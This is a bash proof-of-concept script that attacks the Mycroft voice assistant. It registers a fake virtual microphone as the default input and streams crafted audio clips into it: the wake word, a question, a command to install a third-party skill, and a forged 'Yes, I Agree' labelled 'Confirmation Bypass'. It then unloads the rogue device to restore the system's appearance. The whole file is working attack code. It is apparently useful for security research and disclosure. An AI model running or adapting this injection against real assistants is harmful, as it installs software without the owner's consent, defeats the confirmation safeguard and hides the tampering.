#!/bin/bash
# Requires: ffmpeg, pulseaudio, pactl: sudo apt install pulseaudio ffmpeg.
clear
echo "[*] Creating fake virtual mic..."
pactl load-module module-pipe-source source_name=virtmic file=/tmp/virtmic format=s16le rate=16000 channels=1
#Expected: create a file and a virtual device.
echo "[*] Setting fake virtual mic as Default..."
pactl set-default-source virtmic
#Expected: if you open your volume control panel, you'll see this new device listed *and selected*.
echo "[*] Sending crafted Alert: Hey Mycroft!..."
ffmpeg -loglevel quiet -re -i ./samples/Hey_Mycroft.ogg -f s16le -ar 16000 -ac 1 - > /tmp/virtmic
sleep 5
#Expected: Tu-duh! (Mycroft alert sound).
#Known bug (Docker version only): Mycroft sometimes awaits for extra input after receiving the recording.
#Re-sending the current record fixes it.
echo "[*] Sending crafted Question: Who is Javier Milei?"
ffmpeg -loglevel quiet -re -i ./samples/Who_Is_Javier_Milei.ogg -f s16le -ar 16000 -ac 1 - > /tmp/virtmic
sleep 3
ffmpeg -loglevel quiet -re -i ./samples/Who_Is_Javier_Milei.ogg -f s16le -ar 16000 -ac 1 - > /tmp/virtmic
sleep 15
#Expected: Javier Gerardo Milei is an argentine economist...
echo "[*] Sending crafted Alert: Hey Mycroft!..."
ffmpeg -loglevel quiet -re -i ./samples/Hey_Mycroft.ogg -f s16le -ar 16000 -ac 1 - > /tmp/virtmic
sleep 5
#Expected: Tu-duh!
echo "[*] Sending crafted Command: Install SpeedTest by Luke5Sky"
ffmpeg -loglevel quiet -re -i ./samples/Install_Speedtest.ogg -f s16le -ar 16000 -ac 1 - > /tmp/virtmic
sleep 3
ffmpeg -loglevel quiet -re -i ./samples/Install_Speedtest.ogg -f s16le -ar 16000 -ac 1 - > /tmp/virtmic
sleep 7
#Expected: Confirmation to install said skill.
echo "[*] Sending crafted Confirmation Bypass: Yes, I Agree"
ffmpeg -loglevel quiet -re -i ./samples/Yes_I_Agree.ogg -f s16le -ar 16000 -ac 1 - > /tmp/virtmic
#Expected: Install start.
echo "[*] Removing the virtual mic..."
pactl unload-module module-pipe-source
#Expected: You should now see everything as it was before, rogue devices removed.